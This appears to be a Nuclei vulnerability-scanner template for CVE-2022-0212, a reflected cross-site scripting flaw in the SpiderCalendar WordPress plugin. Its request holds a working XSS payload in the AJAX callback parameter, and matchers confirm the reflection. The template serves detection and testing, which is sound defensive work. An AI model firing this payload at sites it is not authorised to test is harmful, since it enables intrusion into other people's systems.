id: CVE-2022-0212

info:
  name: SpiderCalendar <= 1.5.65 - Unauthenticated Reflected Cross-Site Scripting
  author: theamanrawat
  severity: medium
  description: |
    The SpiderCalendar WordPress plugin through 1.5.65 does not sanitise and escape the callback parameter before outputting it back in the page via the window AJAX action (available to both unauthenticated and authenticated users), leading to a Reflected Cross-Site Scripting issue.
  reference:
    - https://wpscan.com/vulnerability/15be2d2b-baa3-4845-82cf-3c351c695b47
    - https://wordpress.org/plugins/spider-event-calendar/
    - https://nvd.nist.gov/vuln/detail/CVE-2022-0212
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2022-0212
    cwe-id: CWE-79
  metadata:
    verified: "true"
  tags: cve,cve2022,xss,wpscan,wordpress,wp-plugin,wp,spider-event-calendar,unauthenticated

requests:
  - method: GET
    path:
      - "{{BaseURL}}/wp-admin/admin-ajax.php?action=window&callback=</script><img/src/onerror=alert(document.domain)>"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "spider_Calendar_theme"
          - "</script><img/src/onerror=alert(document.domain)>"
        condition: and

      - type: word
        part: header
        words:
          - "text/html"

      - type: status
        status:
          - 200
